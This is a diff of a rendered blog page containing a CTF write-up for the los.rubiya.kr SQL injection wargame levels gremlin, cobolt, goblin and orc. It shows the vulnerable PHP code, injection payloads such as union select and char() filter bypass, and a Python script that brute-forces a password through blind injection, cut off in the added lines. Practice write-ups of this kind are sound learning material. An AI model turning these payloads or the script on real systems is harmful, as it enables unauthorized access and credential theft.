@@ -3,7 +3,7 @@
   <head prefix="og: http://ogp.me/ns#">
     <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="generator" content="Hugo 0.102.3">
+<meta name="generator" content="Hugo 0.92.2">
 <meta name="theme" content="Color Your World -- gitlab.com/rmaguiar/hugo-theme-color-your-world">
 
 
@@ -124,7 +124,7 @@
       "inLanguage": "en",
       "datePublished": "2021-03-15",
       "dateModified": "2021-03-15",
-      "wordCount" : "1284",
+      "wordCount" : "1283",
       "publisher": {
         "@type": "Person",
         "name": ""
@@ -185,7 +185,7 @@
   
 
 
-<script src="/js/main.f1da21dfea83dc0c36cea0b202c14a97e00aedab567e32702eb120f5ab8d974b.js" integrity="sha256-8doh3&#43;qD3Aw2zqCyAsFKl&#43;AK7atWfjJwLrEg9auNl0s=" crossorigin="anonymous"></script>
+<script src="/js/main.e4ee12b434ffdd596ecf1fbccc43808313345020d5bfbf9a7ff3d761d07da22b.js" integrity="sha256-5O4StDT/3Vluzx&#43;8zEOAgxM0UCDVv7&#43;af/PXYdB9ois=" crossorigin="anonymous"></script>
 
   </head>
 
@@ -341,14 +341,14 @@
   <h3 id="grimlin"><a class="anchor" href="#grimlin" title='Anchor for: Grimlin.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Grimlin</h3> 
 
 <p>To win this game, we force <code>$result['id']</code> return any value.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_gremlin where id=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">id</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and pw=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>;
-</span></span></code></pre></div><p>I use <code>'</code> to escape id param and add a sql command:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;or(1)--+-</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ... where id=&#39;&#39; or(1)-- +-and pw=</span>
-</span></span><span style="display:flex;"><span>    id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; union select &#39;</span>vietcaijvaodaycungduoc<span style="color:#e6db74">&#39; --+-</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># try with union, huh!</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ... many ways</span>
-</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_gremlin where id=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">id</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and pw=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>;
+</code></pre></div><p>I use <code>'</code> to escape id param and add a sql command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;or(1)--+-</span>
+    <span style="color:#75715e"># ... where id=&#39;&#39; or(1)-- +-and pw=</span>
+    id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; union select &#39;</span>vietcaijvaodaycungduoc<span style="color:#e6db74">&#39; --+-</span>
+    <span style="color:#75715e"># try with union, huh!</span>
+    <span style="color:#75715e"># ... many ways</span>
+</code></pre></div>
 
 
 
@@ -361,11 +361,11 @@
 
 <p>Same with <code>Grimlin</code> we must do some trick to force <code>$result['id'] = 'admin'</code></p>
 <p>Focus the php code below:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_cobolt where id=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">id</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and pw=md5(&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>; 
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span>) <span style="color:#a6e22e">solve</span>(<span style="color:#e6db74">&#34;cobolt&#34;</span>);
-</span></span></code></pre></div><p>Clearly <code>union select</code> is a good choice to control value return from id, so the payload look like this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>    id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#75715e">-- and pw=md5(&#39;&#39;) Here id will return &#34;admin&#34; because &#34;pw&#34; is commented
-</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_cobolt where id=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">id</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and pw=md5(&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>; 
+<span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span>) <span style="color:#a6e22e">solve</span>(<span style="color:#e6db74">&#34;cobolt&#34;</span>);
+</code></pre></div><p>Clearly <code>union select</code> is a good choice to control value return from id, so the payload look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#75715e">-- and pw=md5(&#39;&#39;) Here id will return &#34;admin&#34; because &#34;pw&#34; is commented
+</span></code></pre></div>
 
 
 
@@ -377,33 +377,33 @@
   <h3 id="goblin"><a class="anchor" href="#goblin" title='Anchor for: Goblin.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Goblin</h3> 
 
 <p>Focus the php code below:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_goblin where id=&#39;guest&#39; and no=</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">no</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; 
-</span></span><span style="display:flex;"><span>$result <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">mysqli_fetch_array</span>(<span style="color:#a6e22e">mysqli_query</span>($db,$query)); 
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>]) <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;h2&gt;Hello </span><span style="color:#e6db74">{</span>$result[<span style="color:#a6e22e">id</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/h2&gt;&#34;</span>; 
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span>) <span style="color:#a6e22e">solve</span>(<span style="color:#e6db74">&#34;goblin&#34;</span>);
-</span></span></code></pre></div><p>Here the mission is force id return &lsquo;admin&rsquo;, notice the code added <code>@mysqli_fetch_array</code> which return array of values.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_goblin where id=&#39;guest&#39; and no=</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">no</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; 
+$result <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">mysqli_fetch_array</span>(<span style="color:#a6e22e">mysqli_query</span>($db,$query)); 
+<span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>]) <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;h2&gt;Hello </span><span style="color:#e6db74">{</span>$result[<span style="color:#a6e22e">id</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/h2&gt;&#34;</span>; 
+<span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span>) <span style="color:#a6e22e">solve</span>(<span style="color:#e6db74">&#34;goblin&#34;</span>);
+</code></pre></div><p>Here the mission is force id return &lsquo;admin&rsquo;, notice the code added <code>@mysqli_fetch_array</code> which return array of values.</p>
 <p>Continue view the code, it filter some little bit painful sql operator.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/prob|_|\.|\(\)/i&#39;</span>, $_GET[<span style="color:#a6e22e">no</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;No Hack ~_~&#34;</span>); 
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\&#39;|\&#34;|\`/i&#39;</span>, $_GET[<span style="color:#a6e22e">no</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;No Quotes ~_~&#34;</span>); 
-</span></span></code></pre></div><p>Nah, i&rsquo;m good. It doesn&rsquo;t make it hard for me, here i have 2 idea to solve this challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/prob|_|\.|\(\)/i&#39;</span>, $_GET[<span style="color:#a6e22e">no</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;No Hack ~_~&#34;</span>); 
+  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\&#39;|\&#34;|\`/i&#39;</span>, $_GET[<span style="color:#a6e22e">no</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;No Quotes ~_~&#34;</span>); 
+</code></pre></div><p>Nah, i&rsquo;m good. It doesn&rsquo;t make it hard for me, here i have 2 idea to solve this challenge.</p>
 <ul>
 <li>solution 1 : Use char() to make &lsquo;admin&rsquo; string</li>
 <li>solution 2 : Add one condition to find <code>no</code> value of <code>admin</code></li>
 <li>solution 3 : Bruteforce to find <code>no</code> value of <code>admin</code></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- solution 1
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">-- solution 2
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">no</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">-- When we use payload above, the condition of &#39;where&#39; command is 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">no</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Equivelent to `where false or no&gt; 1`
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">-- solution 3 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">-- Use burp intruder to brute force `no` from 1-100, i found value `no` of admin is 2
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">-- so this payload look like: 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
-</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#75715e">-- solution 1
+</span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>)
+
+<span style="color:#75715e">-- solution 2
+</span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">no</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>
+<span style="color:#75715e">-- When we use payload above, the condition of &#39;where&#39; command is 
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">no</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>
+<span style="color:#75715e">-- Equivelent to `where false or no&gt; 1`
+</span><span style="color:#75715e">-- solution 3 
+</span><span style="color:#75715e">-- Use burp intruder to brute force `no` from 1-100, i found value `no` of admin is 2
+</span><span style="color:#75715e">-- so this payload look like: 
+</span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
+</code></pre></div>
 
 
 
@@ -415,55 +415,55 @@
   <h3 id="orc"><a class="anchor" href="#orc" title='Anchor for: orc.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> orc</h3> 
 
 <p>The level is increasing, but i&rsquo;ll never give up xD))</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;./config.php&#34;</span>; 
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">login_chk</span>(); 
-</span></span><span style="display:flex;"><span>  $db <span style="color:#f92672">=</span> <span style="color:#a6e22e">dbconnect</span>(); 
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/prob|_|\.|\(\)/i&#39;</span>, $_GET[<span style="color:#a6e22e">pw</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;No Hack ~_~&#34;</span>); 
-</span></span><span style="display:flex;"><span>  $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_orc where id=&#39;admin&#39; and pw=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>; 
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;hr&gt;query : &lt;strong&gt;</span><span style="color:#e6db74">{</span>$query<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&#34;</span>; 
-</span></span><span style="display:flex;"><span>  $result <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">mysqli_fetch_array</span>(<span style="color:#a6e22e">mysqli_query</span>($db,$query)); 
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>]) <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;h2&gt;Hello admin&lt;/h2&gt;&#34;</span>; 
-</span></span><span style="display:flex;"><span>   
-</span></span><span style="display:flex;"><span>  $_GET[<span style="color:#a6e22e">pw</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($_GET[<span style="color:#a6e22e">pw</span>]); 
-</span></span><span style="display:flex;"><span>  $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select pw from prob_orc where id=&#39;admin&#39; and pw=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>; 
-</span></span><span style="display:flex;"><span>  $result <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">mysqli_fetch_array</span>(<span style="color:#a6e22e">mysqli_query</span>($db,$query)); 
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(($result[<span style="color:#e6db74">&#39;pw&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> ($result[<span style="color:#e6db74">&#39;pw&#39;</span>] <span style="color:#f92672">==</span> $_GET[<span style="color:#e6db74">&#39;pw&#39;</span>])) <span style="color:#a6e22e">solve</span>(<span style="color:#e6db74">&#34;orc&#34;</span>); 
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>); 
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>The challenge have 2 part</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
+  <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;./config.php&#34;</span>; 
+  <span style="color:#a6e22e">login_chk</span>(); 
+  $db <span style="color:#f92672">=</span> <span style="color:#a6e22e">dbconnect</span>(); 
+  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/prob|_|\.|\(\)/i&#39;</span>, $_GET[<span style="color:#a6e22e">pw</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;No Hack ~_~&#34;</span>); 
+  $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_orc where id=&#39;admin&#39; and pw=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>; 
+  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;hr&gt;query : &lt;strong&gt;</span><span style="color:#e6db74">{</span>$query<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&#34;</span>; 
+  $result <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">mysqli_fetch_array</span>(<span style="color:#a6e22e">mysqli_query</span>($db,$query)); 
+  <span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>]) <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;h2&gt;Hello admin&lt;/h2&gt;&#34;</span>; 
+   
+  $_GET[<span style="color:#a6e22e">pw</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($_GET[<span style="color:#a6e22e">pw</span>]); 
+  $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select pw from prob_orc where id=&#39;admin&#39; and pw=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>; 
+  $result <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">mysqli_fetch_array</span>(<span style="color:#a6e22e">mysqli_query</span>($db,$query)); 
+  <span style="color:#66d9ef">if</span>(($result[<span style="color:#e6db74">&#39;pw&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> ($result[<span style="color:#e6db74">&#39;pw&#39;</span>] <span style="color:#f92672">==</span> $_GET[<span style="color:#e6db74">&#39;pw&#39;</span>])) <span style="color:#a6e22e">solve</span>(<span style="color:#e6db74">&#34;orc&#34;</span>); 
+  <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>); 
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>The challenge have 2 part</p>
 <ul>
 <li>part 1: force sql command to return any value</li>
 <li>part 2: brute force to get exactly password</li>
 </ul>
 <p>Part 1:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>    <span style="color:#f92672">?</span>pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; union select &#39;</span>a<span style="color:#e6db74">&#39;
-</span></span></span></code></pre></div><p>OK we done part 1, but wait the function addslashes is used.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    <span style="color:#f92672">?</span>pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; union select &#39;</span>a<span style="color:#e6db74">&#39;
+</span></code></pre></div><p>OK we done part 1, but wait the function addslashes is used.
 It means that we can&rsquo;t use quote.
 In oder to <code>$result['pw'] == $_GET['pw']</code> we only one way is brute force password.
 Notice that, if we inject a true condition, it will return string &lsquo;Hello admin&rsquo;.
 Nice, exploit &hellip;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># ?pw=&#39; or length(pw) &gt; 8 or &#39; -- I extract length of pw is 8</span>
-</span></span><span style="display:flex;"><span>pw <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abc...&#39;</span>
-</span></span><span style="display:flex;"><span>cookie <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;PHPSESSID&#39;</span> : <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>session<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">9</span>):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_lowercase:
-</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;pw&#34;</span> : <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39; or substr(pw,</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)=&#39;</span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, params<span style="color:#f92672">=</span>payload, cookies<span style="color:#f92672">=</span>cookie)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Hello admin&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
-</span></span><span style="display:flex;"><span>            pw <span style="color:#f92672">+=</span> c
-</span></span><span style="display:flex;"><span>            print(pw)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#pw=095a9852</span>
-</span></span></code></pre></div><hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> string
+
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php&#34;</span>
+<span style="color:#75715e"># ?pw=&#39; or length(pw) &gt; 8 or &#39; -- I extract length of pw is 8</span>
+pw <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+session <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abc...&#39;</span>
+cookie <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;PHPSESSID&#39;</span> : <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>session<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>}
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">9</span>):
+    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_lowercase:
+        payload <span style="color:#f92672">=</span> {
